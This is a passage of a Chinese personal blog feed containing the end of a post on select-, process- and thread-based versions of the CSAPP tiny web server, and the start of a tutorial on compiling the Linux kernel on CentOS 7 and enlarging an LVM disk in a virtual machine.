class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); //line:netp:tiny:accept</span><br><span class="hljs-comment">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                    port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">doit(connfd);                                             //line:netp:tiny:doit</span><br><span class="hljs-comment">Close(connfd);                                            //line:netp:tiny:close</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-comment">//多路复用 </span><br>    fd_set rds, tmp;<br>    <span class="hljs-type">int</span> fd_max,i;<br>    FD_ZERO(&amp;rds);<br>    FD_SET(listenfd, &amp;rds);<br>    fd_max = listenfd + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        tmp = rds;<br>        select(fd_max, &amp;tmp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;fd_max; i++) &#123;<br>            <span class="hljs-keyword">if</span> (FD_ISSET(i, &amp;tmp)) &#123;<br>                <span class="hljs-keyword">if</span> (listenfd == i) &#123;<br>                    clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>                    connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>                    FD_SET(connfd, &amp;rds);<br>                    <span class="hljs-keyword">if</span> (fd_max &lt;= connfd) fd_max = connfd+<span class="hljs-number">1</span>;<br><br>                    Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                        port, MAXLINE, <span class="hljs-number">0</span>);<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    doit(i);<br>                    FD_CLR(i, &amp;rds);<br>                    Close(i);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>sudo ./tiny 6666<br></code></pre></td></tr></table></figure><p><img src="/images/os4-6.png"></p><p><img src="/images/os4-7.png"></p><h2 id="实验结果分析"><a href="#实验结果分析" class="headerlink" title="实验结果分析"></a>实验结果分析</h2><p>使用进程最简单，因为每个进程互相独立，不影响主程序的稳定性，子进程崩溃没关系，每个子进程都有自己的地址空间和相关资源，总体能够达到的性能上限非常大，但是调度开销比较大。<br>多路复用编程复杂度高，但是由于多路复用是在单一进程的上下文中的，因此每个逻辑流程都能访问该进程的全部地址空间，所以开销比多进程低得多。<br>多线程每个线程都有自己的线程上下文，所有的运行在一个进程里的线程共享该进程的整个虚拟地址空间。由于线程运行在单一进程中，因此共享这个进程虚拟地址空间的整个内容，包括它的代码、数据、堆、共享库和打开的文件。优点是程序逻辑和控制方式简单，所有线程可以直接共享内存和变量等，耗的总资源比进程方式好。但是由于每个线程与主程序共用地址空间，地址空间受限，一个线程的崩溃也可能影响到整个程序的稳定性，性能提高也有限制。</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>tiny.c修改的main函数部分代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> connfd = *((<span class="hljs-type">int</span> *)argv);<br>    Pthread_detach(pthread_self());<br>    doit(connfd);  <br>    Close(connfd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); <span class="hljs-comment">//line:netp:tiny:accept</span><br>        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                    port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>doit(connfd);                                             <span class="hljs-comment">//line:netp:tiny:doit</span><br>Close(connfd);                                            <span class="hljs-comment">//line:netp:tiny:close</span><br>    &#125;<br>    <span class="hljs-comment">// 多进程 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">        clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="hljs-comment">        if (Fork() == 0) &#123;</span><br><span class="hljs-comment">            Close(listenfd);</span><br><span class="hljs-comment">            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                        port, MAXLINE, 0);</span><br><span class="hljs-comment">            printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">            doit(connfd);</span><br><span class="hljs-comment">            Close(connfd);</span><br><span class="hljs-comment">            exit(0);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        Close(connfd);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-comment">//多路复用 </span><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">    fd_set rds, tmp;</span><br><span class="hljs-comment">    int fd_max,i;</span><br><span class="hljs-comment">    FD_ZERO(&amp;rds);</span><br><span class="hljs-comment">    FD_SET(listenfd, &amp;rds);</span><br><span class="hljs-comment">    fd_max = listenfd + 1;</span><br><span class="hljs-comment">while (1) &#123;</span><br><span class="hljs-comment">        tmp = rds;</span><br><span class="hljs-comment">        select(fd_max, &amp;tmp, NULL, NULL, NULL);</span><br><span class="hljs-comment">        for (i=0; i&lt;fd_max; i++) &#123;</span><br><span class="hljs-comment">            if (FD_ISSET(i, &amp;tmp)) &#123;</span><br><span class="hljs-comment">                if (listenfd == i) &#123;</span><br><span class="hljs-comment">                    clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">                    connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="hljs-comment">                    FD_SET(connfd, &amp;rds);</span><br><span class="hljs-comment">                    if (fd_max &lt;= connfd) fd_max = connfd+1;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                    Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                        port, MAXLINE, 0);</span><br><span class="hljs-comment">                    printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                else &#123;</span><br><span class="hljs-comment">                    doit(i);</span><br><span class="hljs-comment">                    FD_CLR(i, &amp;rds);</span><br><span class="hljs-comment">                    Close(i);</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;*/</span> <br>    <span class="hljs-comment">//多线程 </span><br>    <br>    <span class="hljs-comment">/*pthread_t tid;</span><br><span class="hljs-comment">while (1) &#123;</span><br><span class="hljs-comment">        clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="hljs-comment">            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                        port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">        Pthread_create(&amp;tid, NULL, thread, &amp;connfd);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核编译与系统调用</title>
    <link href="/blog/2019/10/21/Linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <url>/blog/2019/10/21/Linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>今天尝试一下人生中第一次编译Linux内核，遇到了几个问题，也收获了很多技能，总的来说还是很有意义的。</strong></p><p><img src="/images/fj23.jpg"></p><span id="more"></span><h2 id="Linux体系结构简介"><a href="#Linux体系结构简介" class="headerlink" title="Linux体系结构简介"></a>Linux体系结构简介</h2><h3 id="Linux体系结构"><a href="#Linux体系结构" class="headerlink" title="Linux体系结构"></a>Linux体系结构</h3><p>Linux可以分为两部分，分别为用户空间和内核空间具体如下图：</p><p><img src="/images/linux-k1.png"></p><p>1)<strong>用户空间包括</strong>：用户的应用程序、C库</p><p>2)<strong>内核空间包括</strong>：系统调用接口、内核（狭义的）、平台架构相关的代码</p><h3 id="Linux内核结构（广义内核）"><a href="#Linux内核结构（广义内核）" class="headerlink" title="Linux内核结构（广义内核）"></a>Linux内核结构（广义内核）</h3><p>Linux内核由七个部分构成，具体如下图所示：</p><p><img src="/images/linux-k2.png"></p><p>a)        <strong>系统调用接口（SCI）</strong>：open、read、write等系统调用<br>b)        <strong>进程管理（PM）</strong>：创建进程、删除进程、调度进程等<br>c)        <strong>内存管理（MM）</strong>：内存分配、管理等<br>d)        <strong>虚拟文件系统（VFS）</strong>：为多种文件系统提供统一的操作接口<br>e)        <strong>网络协议栈</strong>：提供各种网络协议<br>f)         <strong>CPU架构相关代码（Arch）</strong>：为的是提高至移植性<br>g)        <strong>设备驱动程序（DD）</strong>：各种设备驱动，占到内核的70%左右代码</p><h2 id="Linux内核源码简介"><a href="#Linux内核源码简介" class="headerlink" title="Linux内核源码简介"></a>Linux内核源码简介</h2><h3 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h3><p>可以从官网直接下载：<a href="https://www.kernel.org/">https://www.kernel.org/</a></p><h3 id="源码目录简介"><a href="#源码目录简介" class="headerlink" title="源码目录简介"></a>源码目录简介</h3><p>其源码主要有以下目录（介绍重要目录）：<br>a)        <strong>Arch目录：</strong>存放处理器相关的代码。下设子目录，分别对应具体的CPU，每个子目录有boot，mm，以及kernel三个子目录，分别对应系统引导以及存储管理，和系统调用<br>b)        <strong>Include目录</strong>：内核所需要的大部分头文件目录。与平台无关的在include&#x2F;linux子目录下，与平台相关的则放在include相应的子目录中。<br>c)        <strong>fs目录：</strong>存放各种文件系统的实现代码。<br>d)        <strong>init目录：</strong>init子目录包含核心的初始化代码（不是系统的引导代码）。其包含两个文件main.c和version.c，可以用来研究核心如何工作。<br>e)        <strong>ipc目录：</strong>包含核心进程间的通信代码。<br>f)         <strong>kernel目录：</strong>包含内核管理的核心代码。与硬件相关代码放在arch&#x2F;*&#x2F;kernel目录下。<br>g)        <strong>mm目录：</strong>包含了所有的内存管理代码。与硬件相关的内存管理代码位于arch&#x2F;*&#x2F;mm目录下。<br>h)        <strong>scripts目录：</strong>包含用于配置核心的脚本文件。<br>i)          <strong>lib目录：</strong>包含了核心的库代码，与硬件相关的库代码被放在arch&#x2F;*&#x2F;lib&#x2F;目录下</p><h2 id="Linux内核编译（CentOS-7）"><a href="#Linux内核编译（CentOS-7）" class="headerlink" title="Linux内核编译（CentOS 7）"></a>Linux内核编译（CentOS 7）</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><strong>安装所需的软件包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo yum update<br>sudo yum install -y ncurses-devel make gcc bc bison flex elfutils-libelf-devel openssl-devel grub2<br></code></pre></td></tr></table></figure><p><strong>下载内核源码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.17.11.tar.xz<br></code></pre></td></tr></table></figure><p>这里我用的是内核的4.17.11版本。</p><p><strong>解压缩到当前目录：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xf linux-4.17.11.tar.xz<br></code></pre></td></tr></table></figure><p><strong>重用当前系统内核的配置：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -v /boot/config-3.10.0-693.el7.x86_64 .config<br></code></pre></td></tr></table></figure><p>然后我们就可以使用make menuconfig开启菜单了，随后即可自由配置所需的内核模块：</p><p><img src="/images/linux-k3.png"></p><p>配置完config之后，保存并退出。</p><h3 id="虚拟机增加磁盘容量"><a href="#虚拟机增加磁盘容量" class="headerlink" title="虚拟机增加磁盘容量"></a>虚拟机增加磁盘容量</h3><p><strong>如果你的虚拟机磁盘容量大于30GB请直接跳过这部分！</strong></p><p>由于当时安装虚拟机时没考虑去用它编译内核，因此虚拟机磁盘容量只有20GB，然后内核编译过程中就会出错，因为磁盘容量不足，因此这里说一下如何给CentOS 7虚拟机磁盘扩容。</p><h4 id="1-VMware扩展磁盘"><a href="#1-VMware扩展磁盘" class="headerlink" title="1. VMware扩展磁盘"></a>1. VMware扩展磁盘</h4><p>首先将虚拟机关机，在虚拟机上点击右键，设置，点硬盘，扩展，我这里设置的是40G，如果主机硬盘够大可以多设置一些，然后点击扩展，随后启动虚拟机。</p><p><img src="/images/linux-k4.png"></p><h4 id="2-CentOS中扩展"><a href="#2-CentOS中扩展" class="headerlink" title="2. CentOS中扩展"></a>2. CentOS中扩展</h4><p><strong>首先查看系统的磁盘情况：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo fdisk -l<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo fdisk -l<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br><br>Disk /dev/sda: 42.9 GB, 42949672960 bytes, 83886080 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br>Disk label <span class="hljs-built_in">type</span>: dos<br>Disk identifier: 0x0009003d<br><br>   Device Boot      Start         End      Blocks   Id  System<br>/dev/sda1   *        2048     2099199     1048576   83  Linux<br>/dev/sda2         2099200    41943039    19921920   8e  Linux LVM<br>/dev/sda3        41943040    83886079    20971520   83  Linux<br><br>Disk /dev/mapper/centos-root: 39.6 GB, 39619395584 bytes, 77381632 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br><br>Disk /dev/mapper/centos-swap: 2147 MB, 2147483648 bytes, 4194304 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br></code></pre></td></tr></table></figure><p>分区情况如上所示。</p><p><strong>然后创建新的分区sda3：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo fdisk /dev/sda<br></code></pre></td></tr></table></figure><p>然后根据提示创建分区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): n   <span class="hljs-comment"># 输入 n 表示创建新分区</span><br>Command action<br>   e   extended<br>   p   primary partition (1-4)<br>p<br>Partition number (1-4): 3   <span class="hljs-comment"># 输入 3 表示sda3，因为前面已经有两个了</span><br>First cylinder (1306-4568, default 1306):     <span class="hljs-comment"># 回车，按默认值</span><br>Using default value 1306<br>Last cylinder, +cylinders or +size&#123;K,M,G&#125; (1306-4568, default 4568):   <span class="hljs-comment"># 回车，按默认值</span><br>Using default value 4568<br><br>Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): w     <span class="hljs-comment"># 输入 w 保存退出 </span><br>The partition table has been altered!<br></code></pre></td></tr></table></figure><p><strong>再次查看分区情况：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo fdisk -l<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Disk /dev/sda: 42.9 GB, 42949672960 bytes, 83886080 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br>Disk label <span class="hljs-built_in">type</span>: dos<br>Disk identifier: 0x0009003d<br><br>   Device Boot      Start         End      Blocks   Id  System<br>/dev/sda1   *        2048     2099199     1048576   83  Linux<br>/dev/sda2         2099200    41943039    19921920   8e  Linux LVM<br>/dev/sda3        41943040    83886079    20971520   83  Linux<br><br>Disk /dev/mapper/centos-root: 39.6 GB, 39619395584 bytes, 77381632 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br><br>Disk /dev/mapper/centos-swap: 2147 MB, 2147483648 bytes, 4194304 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br></code></pre></td></tr></table></figure><p>分区已经变成3个了，但是还没有挂载，还不能使用。</p><p><strong>重启操作系统：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo reboot<br></code></pre></td></tr></table></figure><p><strong>格式化新的分区为ext3文件系统：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkfs -t ext3 /dev/sda3<br></code></pre></td></tr></table></figure><p><strong>将物理硬盘分区初始化为物理卷：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pvcreate /dev/sda3<br></code></pre></td></tr></table></figure><p><strong>向卷组中添加物理卷来增加卷组的容量：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo <span class="hljs-built_in">df</span> -h<br>Filesystem               Size  Used Avail Use% Mounted on<br>devtmpfs                 894M     0  894M   0% /dev<br>tmpfs                    910M     0  910M   0% /dev/shm<br>tmpfs                    910M   11M  900M   2% /run<br>tmpfs                    910M     0  910M   0% /sys/fs/cgroup<br>/dev/mapper/centos-root   37G   21G   17G  55% /<br>/dev/sda1               1014M  313M  702M  31% /boot<br>tmpfs                    182M  4.0K  182M   1% /run/user/42<br>tmpfs                    182M   24K  182M   1% /run/user/1000<br>/dev/sr0                 8.1G  8.1G     0 100% /run/media/admin/CentOS 7 x86_64<br>tmpfs                    182M     0  182M   0% /run/user/0<br><br></code></pre></td></tr></table></figure><p>从以上信息我们可以看出，centos就是root所在的组名，输入指令增加卷组容量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vgextend centos /dev/sda3<br></code></pre></td></tr></table></figure><p><strong>查看可扩展空间大小并扩充磁盘空间：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo vgdisplay <br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>  --- Volume group ---<br>  VG Name               centos<br>  System ID             <br>  Format                lvm2<br>  Metadata Areas        2<br>  Metadata Sequence No  5<br>  VG Access             <span class="hljs-built_in">read</span>/write<br>  VG Status             resizable<br>  MAX LV                0<br>  Cur LV                2<br>  Open LV               2<br>  Max PV                0<br>  Cur PV                2<br>  Act PV                2<br>  VG Size               38.99 GiB<br>  PE Size               4.00 MiB<br>  Total PE              9982<br>  Alloc PE / Size       9958 / &lt;38.90 GiB<br>  Free  PE / Size       24 / 96.00 MiB<br>  VG UUID               IW5x2l-MRIe-AbnO-u110-wmFr-QCJj-DwN41a<br><br></code></pre></td></tr></table></figure><p>正常未扩容之前Free  PE &#x2F; Size应该很大，由于我是先进行了扩容后写的博客，这里没法展示之前原本的数据。</p><p><strong>扩充磁盘空间：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lvextend -L+20G /dev/mapper/vg_test001-lv_root /dev/sda3<br></code></pre></td></tr></table></figure><p>上面的20G就是我们扩容的容量，最大不应当超过Free  PE &#x2F; Size的值。</p><p><strong>增大或者收缩未加载的文件系统的大小：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 